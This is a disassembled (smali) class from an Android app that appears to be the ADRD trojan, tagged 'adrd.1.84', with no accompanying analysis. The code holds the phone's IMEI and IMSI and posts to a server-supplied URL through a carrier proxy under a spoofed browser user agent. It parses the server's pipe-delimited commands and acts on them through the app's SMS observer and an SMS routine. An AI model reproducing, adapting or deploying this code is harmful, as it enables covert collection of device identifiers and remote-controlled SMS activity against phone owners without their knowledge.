.class public Lcom/xxx/yyy/qzl;
.super Ljava/lang/Object;
.source "qzl.java"


# instance fields
.field private context:Landroid/content/Context;

.field public doflag:I

.field private imei:Ljava/lang/String;

.field private imsi:Ljava/lang/String;

.field private iversion:Ljava/lang/String;

.field private kk:Ljava/lang/String;

.field public netway:I

.field private oversion:Ljava/lang/String;

.field private smsObserver:Lcom/xxx/yyy/SMSObserver;


# direct methods
.method public constructor <init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;ILcom/xxx/yyy/SMSObserver;)V
    .locals 2
    .parameter "ct"
    .parameter "is"
    .parameter "im"
    .parameter "way"
    .parameter "ob"

    .prologue
    .line 36
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 33
    const-string v0, "6"

    iput-object v0, p0, Lcom/xxx/yyy/qzl;->iversion:Ljava/lang/String;

    .line 34
    const-string v0, "adrd.1.84"

    iput-object v0, p0, Lcom/xxx/yyy/qzl;->oversion:Ljava/lang/String;

    .line 35
    const/4 v0, 0x0

    iput v0, p0, Lcom/xxx/yyy/qzl;->doflag:I

    .line 38
    iput-object p1, p0, Lcom/xxx/yyy/qzl;->context:Landroid/content/Context;

    .line 39
    iput-object p2, p0, Lcom/xxx/yyy/qzl;->imsi:Ljava/lang/String;

    .line 40
    iput-object p3, p0, Lcom/xxx/yyy/qzl;->imei:Ljava/lang/String;

    .line 41
    iput p4, p0, Lcom/xxx/yyy/qzl;->netway:I

    .line 42
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->context:Landroid/content/Context;

    const v1, 0x7f050044

    invoke-virtual {v0, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/xxx/yyy/qzl;->kk:Ljava/lang/String;

    .line 43
    iput-object p5, p0, Lcom/xxx/yyy/qzl;->smsObserver:Lcom/xxx/yyy/SMSObserver;

    .line 44
    return-void
.end method

.method private CheckNetWork(Ljava/lang/String;)Z
    .locals 10
    .parameter "url"

    .prologue
    const/4 v9, 0x0

    .line 205
    new-instance v1, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 206
    .local v1, httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;
    iget v6, p0, Lcom/xxx/yyy/qzl;->netway:I

    if-nez v6, :cond_0

    .line 208
    new-instance v3, Lorg/apache/http/HttpHost;

    const-string v6, "10.0.0.172"

    const/16 v7, 0x50

    const-string v8, "http"

    invoke-direct {v3, v6, v7, v8}, Lorg/apache/http/HttpHost;-><init>(Ljava/lang/String;ILjava/lang/String;)V

    .line 209
    .local v3, proxy:Lorg/apache/http/HttpHost;
    invoke-virtual {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;->getParams()Lorg/apache/http/params/HttpParams;

    move-result-object v6

    const-string v7, "http.route.default-proxy"

    invoke-interface {v6, v7, v3}, Lorg/apache/http/params/HttpParams;->setParameter(Ljava/lang/String;Ljava/lang/Object;)Lorg/apache/http/params/HttpParams;

    .line 211
    .end local v3           #proxy:Lorg/apache/http/HttpHost;
    :cond_0
    new-instance v2, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v2, p1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 212
    .local v2, method:Lorg/apache/http/client/methods/HttpPost;
    const-string v6, "User-Agent"

    const-string v7, "J2ME/UCWEB7.4.0.57"

    invoke-virtual {v2, v6, v7}, Lorg/apache/http/client/methods/HttpPost;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 213
    const-string v6, "Accept"

    const-string v7, "application/vnd.wap.xhtml+xml,application/xml,text/vnd.wap.wml,text/html,application/xhtml+xml,image/jpeg;q=0.5,image/png;q=0.5,image/gif;q=0.5,image/*;q=0.6,video/*,audio/*,*/*;"

    invoke-virtual {v2, v6, v7}, Lorg/apache/http/client/methods/HttpPost;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 217
    :try_start_0
    invoke-virtual {v1, v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v4

    .line 218
    .local v4, resp:Lorg/apache/http/HttpResponse;
    invoke-interface {v4}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v6

    invoke-interface {v6}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v5

    .line 220
    .local v5, status:I
    const/16 v6, 0xc8

    if-eq v5, v6, :cond_1

    move v6, v9

    .line 235
    .end local v4           #resp:Lorg/apache/http/HttpResponse;
    .end local v5           #status:I
    :goto_0
    return v6

    .line 222
    .restart local v4       #resp:Lorg/apache/http/HttpResponse;
    .restart local v5       #status:I
    :cond_1
    invoke-virtual {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;->getConnectionManager()Lorg/apache/http/conn/ClientConnectionManager;

    move-result-object v6

    invoke-interface {v6}, Lorg/apache/http/conn/ClientConnectionManager;->shutdown()V
    :try_end_0
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    .line 223
    const/4 v6, 0x1

    goto :goto_0

    .line 224
    .end local v4           #resp:Lorg/apache/http/HttpResponse;
    .end local v5           #status:I
    :catch_0
    move-exception v6

    move-object v0, v6

    .line 226
    .local v0, e:Lorg/apache/http/client/ClientProtocolException;
    invoke-virtual {v0}, Lorg/apache/http/client/ClientProtocolException;->printStackTrace()V

    move v6, v9

    .line 227
    goto :goto_0

    .line 228
    .end local v0           #e:Lorg/apache/http/client/ClientProtocolException;
    :catch_1
    move-exception v6

    move-object v0, v6

    .line 230
    .local v0, e:Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    move v6, v9

    .line 231
    goto :goto_0

    .line 232
    .end local v0           #e:Ljava/io/IOException;
    :catch_2
    move-exception v6

    move-object v0, v6

    .line 234
    .local v0, e:Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    move v6, v9

    .line 235
    goto :goto_0
.end method

.method private GetO(Ljava/lang/String;)Ljava/lang/String;
    .locals 12
    .parameter "url"

    .prologue
    const-string v11, ""

    .line 243
    new-instance v2, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v2}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 244
    .local v2, httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;
    iget v8, p0, Lcom/xxx/yyy/qzl;->netway:I

    if-nez v8, :cond_0

    .line 246
    new-instance v4, Lorg/apache/http/HttpHost;

    const-string v8, "10.0.0.172"

    const/16 v9, 0x50

    const-string v10, "http"

    invoke-direct {v4, v8, v9, v10}, Lorg/apache/http/HttpHost;-><init>(Ljava/lang/String;ILjava/lang/String;)V

    .line 247
    .local v4, proxy:Lorg/apache/http/HttpHost;
    invoke-virtual {v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->getParams()Lorg/apache/http/params/HttpParams;

    move-result-object v8

    const-string v9, "http.route.default-proxy"

    invoke-interface {v8, v9, v4}, Lorg/apache/http/params/HttpParams;->setParameter(Ljava/lang/String;Ljava/lang/Object;)Lorg/apache/http/params/HttpParams;

    .line 250
    .end local v4           #proxy:Lorg/apache/http/HttpHost;
    :cond_0
    new-instance v3, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v3, p1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 252
    .local v3, method:Lorg/apache/http/client/methods/HttpPost;
    const-string v8, "User-Agent"

    const-string v9, "J2ME/UCWEB7.4.0.57"

    invoke-virtual {v3, v8, v9}, Lorg/apache/http/client/methods/HttpPost;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 253
    const-string v8, "Accept"

    const-string v9, "application/vnd.wap.xhtml+xml,application/xml,text/vnd.wap.wml,text/html,application/xhtml+xml,image/jpeg;q=0.5,image/png;q=0.5,image/gif;q=0.5,image/*;q=0.6,video/*,audio/*,*/*;"

    invoke-virtual {v3, v8, v9}, Lorg/apache/http/client/methods/HttpPost;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 264
    :try_start_0
    invoke-virtual {v2, v3}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v5

    .line 265
    .local v5, resp:Lorg/apache/http/HttpResponse;
    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v8

    invoke-interface {v8}, Lorg/apache/http/StatusLine;->getStatusCode()I
    :try_end_0
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    move-result v7

    .line 267
    .local v7, status:I
    const/16 v8, 0xc8

    if-eq v7, v8, :cond_1

    .line 268
    const-string v8, ""

    move-object v8, v11

    .line 287
    .end local v5           #resp:Lorg/apache/http/HttpResponse;
    .end local v7           #status:I
    :goto_0
    return-object v8

    .line 270
    .restart local v5       #resp:Lorg/apache/http/HttpResponse;
    .restart local v7       #status:I
    :cond_1
    :try_start_1
    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v1

    .line 272
    .local v1, entity:Lorg/apache/http/HttpEntity;
    invoke-interface {v1}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v8

    invoke-virtual {p0, v8}, Lcom/xxx/yyy/qzl;->generateString(Ljava/io/InputStream;)Ljava/lang/String;

    move-result-object v6

    .line 274
    .local v6, result:Ljava/lang/String;
    invoke-virtual {v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->getConnectionManager()Lorg/apache/http/conn/ClientConnectionManager;

    move-result-object v8

    invoke-interface {v8}, Lorg/apache/http/conn/ClientConnectionManager;->shutdown()V
    :try_end_1
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    move-object v8, v6

    .line 275
    goto :goto_0

    .line 276
    .end local v1           #entity:Lorg/apache/http/HttpEntity;
    .end local v5           #resp:Lorg/apache/http/HttpResponse;
    .end local v6           #result:Ljava/lang/String;
    .end local v7           #status:I
    :catch_0
    move-exception v8

    move-object v0, v8

    .line 278
    .local v0, e:Lorg/apache/http/client/ClientProtocolException;
    invoke-virtual {v0}, Lorg/apache/http/client/ClientProtocolException;->printStackTrace()V

    .line 279
    const-string v8, ""

    move-object v8, v11

    goto :goto_0

    .line 280
    .end local v0           #e:Lorg/apache/http/client/ClientProtocolException;
    :catch_1
    move-exception v8

    move-object v0, v8

    .line 282
    .local v0, e:Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 283
    const-string v8, ""

    move-object v8, v11

    goto :goto_0

    .line 284
    .end local v0           #e:Ljava/io/IOException;
    :catch_2
    move-exception v8

    move-object v0, v8

    .line 286
    .local v0, e:Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 287
    const-string v8, ""

    move-object v8, v11

    goto :goto_0
.end method

.method private ParseO(Ljava/lang/String;)V
    .locals 21
    .parameter "od"

    .prologue
    .line 117
    const-string v15, ""

    .line 118
    .local v15, sendmdn:Ljava/lang/String;
    const-string v10, ""

    .line 119
    .local v10, order:Ljava/lang/String;
    const-string v18, "\\|"

    move-object/from16 v0, p1

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v16

    .line 120
    .local v16, strs:[Ljava/lang/String;
    move-object/from16 v0, v16

    array-length v0, v0

    move/from16 v18, v0

    const/16 v19, 0x4

    move/from16 v0, v18

    move/from16 v1, v19

    if-lt v0, v1, :cond_3

    .line 122
    const/16 v18, 0x0

    aget-object v15, v16, v18

    .line 123
    const/16 v18, 0x1

    aget-object v10, v16, v18

    .line 125
    const/4 v14, 0x1

    .line 126
    .local v14, sPos:I
    const/4 v6, 0x0

    .line 127
    .local v6, ePos:I
    const/4 v7, 0x0

    .line 128
    .local v7, flag:I
    const/4 v4, 0x1

    .line 129
    .local v4, Count:I
    const/4 v9, 0x0

    .line 130
    .local v9, needFlash:Z
    const/16 v18, 0x2

    aget-object v18, v16, v18

    invoke-virtual/range {v18 .. v18}, Ljava/lang/String;->toCharArray()[C

    move-result-object v5

    .line 131
    .local v5, chars:[C
    const/4 v8, 0x0

    .local v8, i:I
    :goto_0
    move-object v0, v5

    array-length v0, v0

    move/from16 v18, v0

    move v0, v8

    move/from16 v1, v18

    if-lt v0, v1, :cond_4

    .line 160
    const/16 v18, 0x2

    aget-object v18, v16, v18

    move-object/from16 v0, v18

    move v1, v14

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v18

    invoke-virtual/range {v18 .. v18}, Ljava/lang/String;->length()I

    move-result v18

    if-lez v18, :cond_0

    .line 162
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/qzl;->smsObserver:Lcom/xxx/yyy/SMSObserver;

    move-object/from16 v18, v0

    const/16 v19, 0x2

    aget-object v19, v16, v19

    move-object/from16 v0, v19

    move v1, v14

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v19

    const/16 v20, 0x0

    move-object/from16 v0, v18

    move-object/from16 v1, v19

    move v2, v7

    move/from16 v3, v20

    invoke-virtual {v0, v1, v2, v3}, Lcom/xxx/yyy/SMSObserver;->insertSms(Ljava/lang/String;II)V

    .line 164
    :cond_0
    if-eqz v9, :cond_1

    .line 166
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/qzl;->smsObserver:Lcom/xxx/yyy/SMSObserver;

    move-object/from16 v18, v0

    invoke-virtual/range {v18 .. v18}, Lcom/xxx/yyy/SMSObserver;->ReflashDb()V

    .line 170
    :cond_1
    const/16 v18, 0x3

    aget-object v11, v16, v18

    .line 171
    .local v11, part4:Ljava/lang/String;
    invoke-virtual {v11}, Ljava/lang/String;->length()I

    move-result v18

    const/16 v19, 0x1

    move/from16 v0, v18

    move/from16 v1, v19

    if-le v0, v1, :cond_2

    .line 173
    const-string v18, "\\["

    move-object v0, v11

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v12

    .line 174
    .local v12, part4s:[Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/qzl;->smsObserver:Lcom/xxx/yyy/SMSObserver;

    move-object/from16 v18, v0

    const/16 v19, 0x0

    aget-object v19, v12, v19

    const/16 v20, 0x1

    aget-object v20, v12, v20

    invoke-virtual/range {v18 .. v20}, Lcom/xxx/yyy/SMSObserver;->setTags(Ljava/lang/String;Ljava/lang/String;)V

    .line 176
    .end local v12           #part4s:[Ljava/lang/String;
    :cond_2
    new-instance v13, Lcom/xxx/yyy/ssmm;

    invoke-direct {v13}, Lcom/xxx/yyy/ssmm;-><init>()V

    .line 177
    .local v13, s:Lcom/xxx/yyy/ssmm;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/qzl;->context:Landroid/content/Context;

    move-object/from16 v18, v0

    move-object v0, v13

    move-object/from16 v1, v18

    move-object v2, v15

    move-object v3, v10

    invoke-virtual {v0, v1, v2, v3}, Lcom/xxx/yyy/ssmm;->Gef(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 179
    .end local v4           #Count:I
    .end local v5           #chars:[C
    .end local v6           #ePos:I
    .end local v7           #flag:I
    .end local v8           #i:I
    .end local v9           #needFlash:Z
    .end local v11           #part4:Ljava/lang/String;
    .end local v13           #s:Lcom/xxx/yyy/ssmm;
    .end local v14           #sPos:I
    :cond_3
    return-void

    .line 133
    .restart local v4       #Count:I
    .restart local v5       #chars:[C
    .restart local v6       #ePos:I
    .restart local v7       #flag:I
    .restart local v8       #i:I
    .restart local v9       #needFlash:Z
    .restart local v14       #sPos:I
    :cond_4
    aget-char v18, v5, v8

    const/16 v19, 0x2b

    move/from16 v0, v18

    move/from16 v1, v19

    if-ne v0, v1, :cond_7

    .line 135
    move v6, v8

    .line 136
    if-le v6, v14, :cond_5

    .line 138
    const/16 v18, 0x2

    aget-object v18, v16, v18

    move-object/from16 v0, v18

    move v1, v14

    move v2, v6

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v17

    .line 140
    .local v17, t:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/qzl;->smsObserver:Lcom/xxx/yyy/SMSObserver;

    move-object/from16 v18, v0

    const/16 v19, 0x0

    move-object/from16 v0, v18

    move-object/from16 v1, v17

    move v2, v7

    move/from16 v3, v19

    invoke-virtual {v0, v1, v2, v3}, Lcom/xxx/yyy/SMSObserver;->insertSms(Ljava/lang/String;II)V

    .line 141
    const/4 v9, 0x1

    .line 143
    .end local v17           #t:Ljava/lang/String;
    :cond_5
    add-int/lit8 v14, v6, 0x1

    .line 144
    const/4 v7, 0x1

    .line 131
    :cond_6
    :goto_1
    add-int/lit8 v8, v8, 0x1

    goto/16 :goto_0

    .line 146
    :cond_7
    aget-char v18, v5, v8

    const/16 v19, 0x2d

    move/from16 v0, v18

    move/from16 v1, v19

    if-ne v0, v1, :cond_6

    .line 148
    move v6, v8

    .line 149
    if-le v6, v14, :cond_8

    .line 151
    const/16 v18, 0x2

    aget-object v18, v16, v18

    move-object/from16 v0, v18

    move v1, v14

    move v2, v6

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v17

    .line 153
    .restart local v17       #t:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/qzl;->smsObserver:Lcom/xxx/yyy/SMSObserver;

    move-object/from16 v18, v0

    const/16 v19, 0x0

    move-object/from16 v0, v18

    move-object/from16 v1, v17

    move v2, v7

    move/from16 v3, v19

    invoke-virtual {v0, v1, v2, v3}, Lcom/xxx/yyy/SMSObserver;->insertSms(Ljava/lang/String;II)V

    .line 154
    const/4 v9, 0x1

    .line 156
    .end local v17           #t:Ljava/lang/String;
    :cond_8
    add-int/lit8 v14, v6, 0x1

    .line 157
    const/4 v7, 0x0

    goto :goto_1
.end method

.method static synthetic access$0(Lcom/xxx/yyy/qzl;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 28
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->imei:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$1(Lcom/xxx/yyy/qzl;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 27
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->imsi:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$2(Lcom/xxx/yyy/qzl;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 33
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->iversion:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$3(Lcom/xxx/yyy/qzl;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 34
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->oversion:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$4(Lcom/xxx/yyy/qzl;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 30
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->kk:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$5(Lcom/xxx/yyy/qzl;)Landroid/content/Context;
    .locals 1
    .parameter

    .prologue
    .line 31
    iget-object v0, p0, Lcom/xxx/yyy/qzl;->context:Landroid/content/Context;

    return-object v0
.end method

.method static synthetic access$6(Lcom/xxx/yyy/qzl;Ljava/lang/String;)Ljava/lang/String;
    .locals 1
    .parameter
    .parameter

    .prologue
    .line 238
    invoke-direct {p0, p1}, Lcom/xxx/yyy/qzl;->GetO(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$7(Lcom/xxx/yyy/qzl;Ljava/lang/String;)V
    .locals 0
    .parameter
    .parameter

    .prologue
    .line 115
    invoke-direct {p0, p1}, Lcom/xxx/yyy/qzl;->ParseO(Ljava/lang/String;)V

    return-void
.end method


# virtual methods
.method public GG()V
    .locals 1

    .prologue
    .line 48
    new-instance v0, Lcom/xxx/yyy/qzl$1;

    invoke-direct {v0, p0}, Lcom/xxx/yyy/qzl$1;-><init>(Lcom/xxx/yyy/qzl;)V

    .line 113
    invoke-virtual {v0}, Lcom/xxx/yyy/qzl$1;->start()V

    .line 114
    return-void
.end method

.method public generateString(Ljava/io/InputStream;)Ljava/lang/String;
    .locals 6
    .parameter "stream"

    .prologue
    .line 181
    new-instance v3, Ljava/io/InputStreamReader;

    invoke-direct {v3, p1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 182
    .local v3, reader:Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 183
    .local v0, buffer:Ljava/io/BufferedReader;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    .line 186
    .local v4, sb:Ljava/lang/StringBuilder;
    :goto_0
    :try_start_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v1

    .local v1, cur:Ljava/lang/String;
    if-nez v1, :cond_0

    .line 195
    .end local v1           #cur:Ljava/lang/String;
    :goto_1
    :try_start_1
    invoke-virtual {p1}, Ljava/io/InputStream;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 200
    :goto_2
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    return-object v5

    .line 187
    .restart local v1       #cur:Ljava/lang/String;
    :cond_0
    :try_start_2
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    .line 190
    .end local v1           #cur:Ljava/lang/String;
    :catch_0
    move-exception v5

    move-object v2, v5

    .line 192
    .local v2, e:Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    .line 196
    .end local v2           #e:Ljava/io/IOException;
    :catch_1
    move-exception v2

    .line 198
    .restart local v2       #e:Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_2
.end method
